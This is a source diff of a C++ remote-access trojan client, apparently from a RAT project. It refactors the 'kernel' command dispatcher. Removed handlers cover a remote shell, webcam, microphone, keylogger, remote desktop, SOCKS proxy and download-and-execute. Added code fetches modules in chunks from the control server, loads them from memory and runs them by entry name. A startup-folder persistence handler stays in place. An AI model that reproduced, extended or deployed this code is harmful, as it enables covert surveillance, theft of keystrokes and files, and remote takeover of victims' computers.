@@ -9,7 +9,7 @@
 #include "utils.h"
 #include  <shlobj.h>
 #include "dbg.h"
-#include "loader.h"
+
 
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "Strmiids.lib") 
@@ -24,6 +24,7 @@ CEventHandler(pClient,KNEL)
 	m_dwModuleSize = 0;
 	m_dwLoadedSize = 0;
 	m_ModuleBuffer = NULL;
+	m_pendingTask = NULL;
 
 	Release();
 	m_hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
@@ -53,8 +54,6 @@ void CKernel::OnOpen()
 
 void CKernel::OnClose()
 {
-
-
 	//
 	Release();
 	SetEvent(m_hEvent); 
@@ -83,47 +82,27 @@ void CKernel::OnEvent(UINT32 e, BYTE* lpData, UINT Size)
 	case KNEL_EDITCOMMENT:
 		OnEditComment((TCHAR*)lpData);
 		break;
-	case KNEL_CMD:
-		OnCmd();
-		break;
-	case KNEL_CHAT:
-		OnChat();
-		break;
-	case KNEL_FILEMGR:
-		OnFileMgr();
-		break;
-	case KNEL_DESKTOP:
-		OnRemoteDesktop();
-		break;
-	case KNEL_CAMERA:
-		OnCamera();
+	case KNEL_EXIT:
+		OnExit();
 		break;
 	case KNEL_RESTART:
 		OnRestart();
 		break;
-	case KNEL_MICROPHONE:
-		OnMicrophone();
-		break;
-	case KNEL_DOWNANDEXEC:
-		OnDownloadAndExec((TCHAR*)lpData);
-		break;
-	case KNEL_EXIT:
-		OnExit();
-		break;
-	case KNEL_KEYBD_LOG:
-		OnKeyboard();
-		break;
-	case KNEL_PROXY_SOCKSPROXY:
-		OnSocksProxy();
-		break;
+	//on run module
+
 	//模块传输......
 	case KNEL_MODULE_INFO:
 		OnModuleInfo((BYTE*)lpData);
 		break;
 	case KNEL_MODULE_CHUNK_DAT:
-		OnRecvModuleChunk((BYTE*)lpData);
+		OnModuleData((BYTE*)lpData);
 		break;
-	//
+
+	case KNEL_RUN_MODULE:
+		OnRunModule(lpData, Size);
+		break;
+
+	//On utils event.
 	case KNEL_UTILS_COPYTOSTARTUP:
 		OnUnilsCopyToStartupMenu();
 		break;
@@ -132,9 +111,6 @@ void CKernel::OnEvent(UINT32 e, BYTE* lpData, UINT Size)
 		break;
 	case KNEL_UTILS_OPEN_WEBPAGE:
 		OnUtilsOpenWebPage((TCHAR*)lpData);
-		break;
-	case KNEL_PROCESSMANAGER:
-		OnProcessManager();
 		break;
 	}
 }
@@ -156,13 +132,33 @@ void CKernel::GetModule(const TCHAR* ModuleName)
 	Send(KNEL_GETMODULE_INFO, ModuleName,sizeof(TCHAR) *( lstrlen(ModuleName) + 1));
 }
 
-void CKernel::OnRecvModuleChunk(BYTE * Chunk)
+
+void CKernel::OnModuleInfo(BYTE * info)
 {
-	DWORD *chunkInfo  = (DWORD*)Chunk;
-	DWORD  moduleSize = chunkInfo[0];
-	DWORD  chunkSize  = chunkInfo[1];
-	BYTE * chunkData  = (BYTE*)&chunkInfo[2];
+	DWORD   ModuleSize = ((DWORD*)info)[0];
+	TCHAR * ModuleName = (TCHAR*)(info + sizeof(DWORD));
 	
+	if (!ModuleSize || lstrcmp(m_CurrentModule, ModuleName))
+	{
+		dbg_log("Invalid module");
+		Release();
+		return;
+	}
+
+	m_dwModuleSize   = ModuleSize;
+	m_ModuleBuffer = new BYTE[m_dwModuleSize];
+
+	GetModuleData();
+}
+
+
+void CKernel::OnModuleData(BYTE * lpData)
+{
+	DWORD *chunkInfo = (DWORD*)lpData;
+	DWORD  moduleSize = chunkInfo[0];
+	DWORD  chunkSize = chunkInfo[1];
+	BYTE * chunkData = (BYTE*)&chunkInfo[2];
+
 	if (moduleSize != m_dwModuleSize)
 	{
 		dbg_log("Invalid module");
@@ -181,83 +177,25 @@ void CKernel::OnRecvModuleChunk(BYTE * Chunk)
 	memcpy(m_ModuleBuffer + m_dwLoadedSize, chunkData, chunkSize);
 
 	m_dwLoadedSize += chunkSize;
-	//continue to get module chunk...
-	GetModuleChunk();
-}
-
-void CKernel::OnModuleInfo(BYTE * info)
-{
-	DWORD   ModuleSize = ((DWORD*)info)[0];
-	TCHAR * ModuleName = (TCHAR*)(info + sizeof(DWORD));
 	
-	if (!ModuleSize || lstrcmp(m_CurrentModule, ModuleName))
+	if (m_dwModuleSize != m_dwLoadedSize)
 	{
-		dbg_log("Invalid module");
-		Release();
+		//continue to get module chunk...
+		GetModuleData();
 		return;
 	}
 
-	m_dwModuleSize   = ModuleSize;
-	m_ModuleBuffer = new BYTE[m_dwModuleSize];
-
-	GetModuleChunk();
+	AddModule(m_ModuleBuffer, m_dwModuleSize);
+	Release();
 }
 
-
-void CKernel::AddModule(const BYTE * lpData, UINT Size)
-{
-	//Load Module From Mem
-	LPVOID lpImageBase = NULL;
-	ModuleEntry lpEntry = NULL;
-	int Error = (Size == 0);
-
-	if (!Error)
-		Error = __LoadFromMem(lpData, &lpImageBase);
-
-	if (!Error)
-	{
-		lpEntry = (ModuleEntry)__GetProcAddress((HMODULE)lpImageBase, "ModuleEntry");
-		Error = (NULL == lpEntry);
-	}
-
-	if (!Error)
-	{
-		//load success.
-		//Kernel 每一时刻只能有一个在Load,...
-		Error = -6;			//FULL
-		for (int i = 0; i < MAX_MODULE_COUNT; i++)
-		{
-			if (m_LoadedModules[i].szModuleName[0] == 0)
-			{
-				m_LoadedModules[i].lpImageBase = lpImageBase;
-				m_LoadedModules[i].lpEntry = lpEntry;
-				lstrcpy(m_LoadedModules[i].szModuleName, m_CurrentModule);
-				Error = 0;
-				break;
-			}
-		}
-	}
-
-	if (Error)
-	{
-		dbg_log("LoadFromMem failed with error: %d \n", Error);
-	}
-}
 
 #define MAX_CHUNK_SIZE 0x10000
 
-void CKernel::GetModuleChunk()
+void CKernel::GetModuleData()
 {
 	DWORD LeftSize = m_dwModuleSize - m_dwLoadedSize;
 	vec bufs[4];
-
-	//load finished.
-	if (!LeftSize)
-	{
-		AddModule(m_ModuleBuffer, m_dwModuleSize);
-		Release();
-		return;
-	}
 
 	LeftSize = LeftSize < MAX_CHUNK_SIZE ? LeftSize : MAX_CHUNK_SIZE;
 
@@ -273,6 +211,139 @@ void CKernel::GetModuleChunk()
 	Send(KNEL_MODULE_CHUNK_GET, bufs, 4);
 	// Total Size,checksum, offset,chunk size,
 }
+void CKernel::AddModule(const BYTE * lpData, UINT Size)
+{
+	//Load Module From Mem
+	LPVOID      lpImageBase = NULL;
+	ModuleEntry lpEntry     = NULL;
+	Module *    module      = NULL;
+	int err = (Size == 0);
+	
+	if (!err)
+	{
+		module = __LoadModule(lpData);
+		if (!module)
+		{
+			err = -1;
+		}
+	}
+
+	if (!err)
+	{
+		//load success.
+		//Kernel 每一时刻只能有一个在Load,...
+		err = -2;			//FULL
+		for (int i = 0; i < MAX_MODULE_COUNT; i++)
+		{
+			SYSTEMTIME sys_time;
+			GetLocalTime(&sys_time);
+
+			if (m_LoadedModules[i].module_name[0])
+				continue;
+
+			m_LoadedModules[i].module = module;
+			
+			lstrcpy(m_LoadedModules[i].module_name, m_CurrentModule);
+
+			wsprintf(
+				m_LoadedModules[i].install_date,
+				TEXT("%d-%02d-%02d %02d:%02d:%02d"),
+				sys_time.wYear,
+				sys_time.wMonth,
+				sys_time.wDay,
+				sys_time.wHour,
+				sys_time.wMinute,
+				sys_time.wSecond
+				);
+
+			//calc md5
+
+
+
+
+			err = 0;
+			break;
+		}
+	}
+
+
+	if (m_pendingTask && !err)
+	{
+		ModuleInfo * module = FindLoadedModule(m_pendingTask->module_name);
+		err = -3;
+
+		if (module)
+		{
+			char ServerAddr[0x20] = { 0 };
+			
+
+			USHORT Port; 
+			ModuleEntry entry;
+
+			err = -4;
+
+#ifdef UNICODE
+			char module_entry[0x20] = { 0 };
+			WideCharToMultiByte(
+				CP_ACP,
+				0,
+				m_pendingTask->module_entry,
+				lstrlen(m_pendingTask->module_entry),
+				module_entry,
+				0x1f,
+				NULL, NULL);
+
+			entry = (ModuleEntry)__GetProcAddress(
+				(HMODULE)module->module->ImageBase,
+				module_entry
+				);
+#else
+			entry = (ModuleEntry)__GetProcAddress(
+				(HMODULE)module->module->ImageBase,
+				m_pendingTask->module_entry
+				);
+
+#endif
+			if (entry)
+			{
+				err = 0;
+
+				Port = GetPeerAddress(ServerAddr);
+
+				entry(
+					m_pClient->m_Iocp,
+					module->module,
+					ServerAddr,
+					Port,
+					(LPVOID*)(m_pendingTask->lpParams + 1),
+					this,
+					(typeRun)Run
+					);
+			}
+		}
+	}
+	
+	if (err)
+	{
+		TCHAR Error[0x100];
+		wsprintf(Error, TEXT("AddModule failed with error : %d"), err);
+		Send(KNEL_ERROR, Error, sizeof(TCHAR) * (lstrlen(Error) + 1));
+	}
+
+	if (m_pendingTask)
+	{
+		if (m_pendingTask->lpParams && 
+			m_pendingTask->lpParams->release)
+		{
+			m_pendingTask->lpParams->release(m_pendingTask->lpParams);
+		}
+
+		delete m_pendingTask;
+		m_pendingTask = NULL;
+	}
+}
+
+
 /*******************************************************************************
 			Get Ping
 			********************************************************************************/
@@ -876,6 +947,12 @@ void CKernel::OnEditComment(TCHAR NewComment[256])
 	return;
 }
 
+void CKernel::OnExit()
+{
+	dbg_log("Kernel Exit");
+	ExitProcess(0);
+}
+
 void CKernel::OnRestart()
 {
 	PROCESS_INFORMATION pi;
@@ -892,261 +969,6 @@ void CKernel::OnRestart()
 		ExitProcess(0);
 	}
 }
-
-
-void CKernel::OnCmd()
-{
-	USHORT Port;
-	char   Name[0x20];
-	Module* module = NULL;
-
-	Port = GetPeerAddress(Name);
-
-	if (!(module = FindLoadedModule(TEXT("cmd"))))
-	{
-		if (!TryAcquire())
-		{
-			TCHAR szError[] = TEXT("Kernel is busy...");
-			Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
-			return;
-		}
-		GetModule(TEXT("cmd"));
-		return;
-	}
-
-	module->lpEntry(m_pClient->m_Iocp, Name, Port, NULL);
-}
-
-void CKernel::OnChat()
-{
-	USHORT Port;
-	char   Name[0x20];
-	Module* module = NULL;
-
-	Port = GetPeerAddress(Name);
-
-	if (!(module = FindLoadedModule(TEXT("chat"))))
-	{
-		if (!TryAcquire())
-		{
-			TCHAR szError[] = TEXT("Kernel is busy...");
-			Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
-			return;
-		}
-		GetModule(TEXT("chat"));
-		return;
-	}
-
-
-	module->lpEntry(m_pClient->m_Iocp, Name, Port, NULL);
-}
-
-void CKernel::OnFileMgr()
-{
-	USHORT Port;
-	char   Name[0x20];
-	Module* module = NULL;
-
-	Port = GetPeerAddress(Name);
-
-	if (!(module = FindLoadedModule(TEXT("filemgr"))))
-	{
-		if (!TryAcquire())
-		{
-			TCHAR szError[] = TEXT("Kernel is busy...");
-			Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
-			return;
-		}
-		GetModule(TEXT("filemgr"));
-		return;
-	}
-
-
-	module->lpEntry(m_pClient->m_Iocp, Name, Port, NULL);
-}
-
-void CKernel::OnRemoteDesktop()
-{
-
-	USHORT Port;
-	char   Name[0x20];
-	Module* module = NULL;
-
-	Port = GetPeerAddress(Name);
-
-	if (!(module = FindLoadedModule(TEXT("rd"))))
-	{
-		if (!TryAcquire())
-		{
-			TCHAR szError[] = TEXT("Kernel is busy...");
-			Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
-			return;
-		}
-		GetModule(TEXT("rd"));
-		return;
-	}
-
-	module->lpEntry(m_pClient->m_Iocp, Name, Port, NULL);
-}
-
-void CKernel::OnMicrophone()
-{
-
-
-	USHORT Port;
-	char   Name[0x20];
-	Module* module = NULL;
-
-	Port = GetPeerAddress(Name);
-
-	if (!(module = FindLoadedModule(TEXT("microphone"))))
-	{
-		if (!TryAcquire())
-		{
-			TCHAR szError[] = TEXT("Kernel is busy...");
-			Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
-			return;
-		}
-		GetModule(TEXT("microphone"));
-		return;
-	}
-
-
-	module->lpEntry(m_pClient->m_Iocp, Name, Port, NULL);
-}
-void CKernel::OnCamera()
-{
-	USHORT Port;
-	char   Name[0x20];
-	Module* module = NULL;
-
-	Port = GetPeerAddress(Name);
-
-	if (!(module = FindLoadedModule(TEXT("camera"))))
-	{
-		if (!TryAcquire())
-		{
-			TCHAR szError[] = TEXT("Kernel is busy...");
-			Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
-			return;
-		}
-		GetModule(TEXT("camera"));
-		return;
-	}
-
-	module->lpEntry(m_pClient->m_Iocp, Name, Port, NULL);
-}
-
-
-#include "..\FileManager\FileDownloader.h"
-
-void CKernel::OnDownloadAndExec(TCHAR*szUrl)
-{
-	USHORT Port;
-	char   Name[0x20];
-	Module* module = NULL;
-	LPVOID ArgList[3] = { 0 };
-	TCHAR szTempPath[0x100];
-
-	Port = GetPeerAddress(Name);
-
-	if (!(module = FindLoadedModule(TEXT("filedownloader"))))
-	{
-		if (!TryAcquire())
-		{
-			TCHAR szError[] = TEXT("Kernel is busy...");
-			Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
-			return;
-		}
-		GetModule(TEXT("filedownloader"));
-		return;
-	}
-
-	GetTempPath(0x100, szTempPath);
-
-	ArgList[0] = (LPVOID)FILEDOWNLOADER_FLAG_RUNAFTERDOWNLOAD;
-	ArgList[1] = szUrl;
-	ArgList[2] = szTempPath;
-
-	module->lpEntry(m_pClient->m_Iocp, Name, Port, ArgList);
-}
-
-
-void CKernel::OnExit()
-{
-	ExitProcess(0);
-}
-
-void CKernel::OnKeyboard()
-{
-	USHORT Port;
-	char   Name[0x20];
-	Module* module = NULL;
-
-	Port = GetPeerAddress(Name);
-
-	if (!(module = FindLoadedModule(TEXT("kblog"))))
-	{
-		if (!TryAcquire())
-		{
-			TCHAR szError[] = TEXT("Kernel is busy...");
-			Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
-			return;
-		}
-		GetModule(TEXT("kblog"));
-		return;
-	}
-
-	module->lpEntry(m_pClient->m_Iocp, Name, Port, NULL);
-}
-
-void CKernel::OnSocksProxy()
-{
-	USHORT Port;
-	char   Name[0x20];
-	Module* module = NULL;
-
-	Port = GetPeerAddress(Name);
-	
-	if (!(module = FindLoadedModule(TEXT("socksproxy"))))
-	{
-		if (!TryAcquire())
-		{
-			TCHAR szError[] = TEXT("Kernel is busy...");
-			Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
-			return;
-		}
-		GetModule(TEXT("socksproxy"));
-		return;
-	}
-
-	module->lpEntry(m_pClient->m_Iocp, Name, Port, NULL);
-}
-
-void CKernel::OnProcessManager()
-{
-	USHORT Port;
-	char   Name[0x20];
-	Module* module = NULL;
-
-	Port = GetPeerAddress(Name);
-
-	if (!(module = FindLoadedModule(TEXT("processmgr"))))
-	{
-		if (!TryAcquire())
-		{
-			TCHAR szError[] = TEXT("Kernel is busy...");
-			Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
-			return;
-		}
-		GetModule(TEXT("processmgr"));
-		return;
-	}
-
-	module->lpEntry(m_pClient->m_Iocp, Name, Port, NULL);
-}
-
-
 
 void CKernel::OnUnilsCopyToStartupMenu()
 {
@@ -1262,3 +1084,121 @@ void CKernel::OnUtilsOpenWebPage(TCHAR* szUrl)
 	ShellExecute(NULL, TEXT("open"), szUrl, NULL, NULL, SW_SHOW);
 }
 
+
+//typedef void(*ModuleEntry)(CIOCP *Iocp ,char* szServerAddr, unsigned short uPort, LPVOID lpParam);
+
+
+int CKernel::Run(CKernel * kernel, const TCHAR * module_name, const TCHAR* module_entry, Params* lpParams)
+{
+	ModuleInfo * module = kernel->FindLoadedModule(module_name);
+	CHAR ServerIP[0x20];
+	USHORT Port;
+	ModuleEntry entry;
+	TCHAR szError[0x100]; 
+	LPVOID* ArgList = NULL;
+	int ret;
+
+	if (!module)
+	{
+		if (!kernel->TryAcquire())
+		{
+			wsprintf(szError, TEXT("Kernel is busy..."));
+			kernel->Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
+			return -1;
+		}
+
+		//
+		kernel->m_pendingTask = (PendingTask*)calloc(1,sizeof(PendingTask));
+		kernel->m_pendingTask->lpParams = lpParams;
+		lstrcpy(kernel->m_pendingTask->module_name, module_name);
+		lstrcpy(kernel->m_pendingTask->module_entry, module_entry);
+
+		kernel->GetModule(module_name);
+		return -2;
+	}
+
+	//exec module if it has been installed.
+	Port = kernel->GetPeerAddress(ServerIP);
+
+#ifdef UNICODE
+	CHAR module_entry_a[64] = { 0 };
+	WideCharToMultiByte(
+		CP_ACP, 
+		0, 
+		module_entry, 
+		lstrlen(module_entry),
+		module_entry_a,
+		63,
+		NULL,
+		NULL);
+		
+	entry = (ModuleEntry)__GetProcAddress(
+		(HMODULE)module->module->ImageBase,
+		module_entry_a
+		);
+#else
+	entry = (ModuleEntry)__GetProcAddress(
+		(HMODULE)module->module->ImageBase,
+		module_entry
+		);
+#endif
+	
+	if (lpParams)
+	{
+		ArgList = (LPVOID*)(lpParams + 1);
+	}
+	
+	ret = entry(
+		kernel->m_pClient->m_Iocp,
+		module->module,
+		ServerIP,
+		Port,
+		ArgList,
+		kernel,
+		(typeRun)Run
+
+		);
+
+	if (ret)
+	{
+		wsprintf(szError,TEXT("Run module %s failed with %d"), module_name, ret);
+		kernel->Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
+	}
+
+	if (lpParams)
+		lpParams->release(lpParams);
+	return 0;
+}
+
+
+void CKernel::OnRunModule(BYTE * lpData, UINT32  Size)
+{
+	TCHAR * module_name  = (TCHAR*)lpData;
+	TCHAR * module_entry = (TCHAR*)(module_name + lstrlen(module_name) + 1);
+	BYTE *  params       = (BYTE*)(module_entry + lstrlen(module_entry) + 1);
+	int     params_size  = Size - (params - lpData);
+	Params * lpParams    = NULL;
+
+	TCHAR szError[0x100];
+	
+	if (params_size < 0){
+		wsprintf(szError, TEXT("Invaliid module info"));
+		Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
+		return;
+	}
+
+	if (params_size > 0)
+	{
+		lpParams = deserialize_kernel_params(params, params_size);
+
+		if (lpParams == NULL)
+		{
+			wsprintf(szError, TEXT("deserialize_kernel_params failed"));
+			Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
+			return;
+		}
+	}
+	
+	//
+	Run(this, module_name, module_entry, lpParams);
+}
